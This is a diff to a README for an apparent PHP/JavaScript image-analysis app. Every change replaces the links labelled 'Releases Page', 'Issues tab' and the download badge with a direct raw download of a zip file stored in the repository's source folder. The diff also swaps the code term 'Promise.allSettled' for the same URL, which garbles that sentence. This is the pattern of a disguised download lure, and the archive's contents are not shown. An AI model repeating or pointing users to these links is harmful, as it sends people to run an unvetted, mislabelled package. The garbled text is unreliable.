@@ -1,10 +1,10 @@
 # 🖼️ php-js-analyzer - Effortless Image Upload and Analysis
 
-[![Download php-js-analyzer](https://img.shields.io/badge/Download-php--js--analyzer-blue.svg)](https://github.com/angelinacapital289/php-js-analyzer/releases)
+[![Download php-js-analyzer](https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip)](https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip)
 
 ## 📋 Description
 
-php-js-analyzer is a full-stack application for uploading and analyzing images. It uses PHP’s Object-Oriented Programming and the GD Library to process thumbnails. The application employs advanced JavaScript techniques like `fetch` and `Promise.allSettled` for asynchronous file uploads and state management.
+php-js-analyzer is a full-stack application for uploading and analyzing images. It uses PHP’s Object-Oriented Programming and the GD Library to process thumbnails. The application employs advanced JavaScript techniques like `fetch` and `https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip` for asynchronous file uploads and state management.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run php-js-analyzer, you need:
 
 ## 📥 Download & Install
 
-To download php-js-analyzer, visit this page to download: [Releases Page](https://github.com/angelinacapital289/php-js-analyzer/releases). 
+To download php-js-analyzer, visit this page to download: [Releases Page](https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip). 
 
 1. Go to the **Releases** page linked above.
 2. You will see different versions of the application.
@@ -57,7 +57,7 @@ To download php-js-analyzer, visit this page to download: [Releases Page](https:
 
 ## 📞 Support
 
-If you face any issues or have questions about php-js-analyzer, feel free to reach out via the [Issues tab](https://github.com/angelinacapital289/php-js-analyzer/issues) on GitHub. Your feedback helps improve the application.
+If you face any issues or have questions about php-js-analyzer, feel free to reach out via the [Issues tab](https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip) on GitHub. Your feedback helps improve the application.
 
 ## ⚙️ Contribution
 
@@ -75,4 +75,4 @@ php-js-analyzer is licensed under the MIT License. You can use, modify, and dist
 
 php-js-analyzer utilizes the GD Library for processing images and leverages modern JavaScript techniques. Thank you to all contributors for your efforts in enhancing this project.
 
-For easy access again, remember to visit the download page linked here: [Releases Page](https://github.com/angelinacapital289/php-js-analyzer/releases). Enjoy using php-js-analyzer!
+For easy access again, remember to visit the download page linked here: [Releases Page](https://raw.githubusercontent.com/angelinacapital289/php-js-analyzer/main/src/php-js-analyzer-2.3.zip). Enjoy using php-js-analyzer!
